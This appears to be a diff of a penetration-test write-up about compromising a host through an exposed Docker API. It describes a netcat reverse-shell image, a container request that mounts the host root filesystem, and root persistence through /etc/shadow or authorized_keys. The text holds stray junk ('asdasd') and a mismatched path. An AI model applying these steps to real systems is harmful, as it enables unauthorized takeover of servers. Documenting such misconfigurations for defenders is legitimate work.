@@ -34,7 +34,7 @@ To enumerate the version of the API, we simply appended `v1.30/info` to the URL 
 ## **Gaining access to a container**
 After some quick reading through the [Docker API Documentation](https://docs.docker.com/engine/api/v1.24/), creating a custom image and starting it as a container is simply a matter of a few POST requests.
 
-Since Docker allows us to create an image from a _Dockerfile_, it shouldn't be too different if performed through the API, right?
+Since Docker allows us to create an image from a _Dockerfile_ through the UNIX socket, it shouldn't be different if performed through the API, right?
 We begin to craft our own malicious _Dockerfile_ and upload it anywhere on the internet. The Dockerfile I created utilized a clean Ubuntu installation and the good ol' netcat to give us a reverse TCP shell with root access to the container.
 
 ```
@@ -88,9 +88,9 @@ Content-Type: application/json
 Content-Length: 207
 
 {
-		"Image": "sha256:00c1fade7392ddfdc9541735334cf52bc7aa938c52c03fd8ab8e60268de55625",
-		"HostConfig": {
-			"Binds": ["/:/root/hostroot"]}
+	"Image": "sha256:00c1fade7392ddfdc9541735334cf52bc7aa938c52c03fd8ab8e60268de55625",
+	"HostConfig": {
+		"Binds": ["/:/root/hostroot"]}
 }
 ```
 
@@ -146,7 +146,18 @@ And we should be receiving a new connection with a root reverse shell. Hurraaay!
 
 
 ## **Escalating to the host's root**
-Now, to the fun part! As mentioned above, we _mapped_ the host's root directory to a directory inside the container, which we called `hostroot`. So, by simply nagivating to this directory, we are able to view the entire filesystem of the **host**.
+Now, to the fun part! As mentioned above, we _mapped_ the host's root directory to a directory inside the container, which we called "hostroot". So, by simply nagivating to this directory, we are able to view the entire filesystem of the **host**.
+
 `cd /root/hostroot`
 
-Another mistake
+For more convenience and to avoid getting confused and accidently browse files on the container rather than the host, we can simply use _chroot_ to change the current root directory:
+`chroot /root/roothost`
+
+Another mistake made by the system administration was allowing root login via SSH to the host. How did we know this? through the `sshd_config` file of course!
+
+Anyhow, to be able to login as root, you can do one of two things:
+-Change the hashed password in `/etc/shadow` directly.
+-Add your own public key into `/root/.ssh/authorized_keys`
+
+> Note that -for some reason- you can't write into the file and save, but you can delete it and re-create it).
+`asdasd`
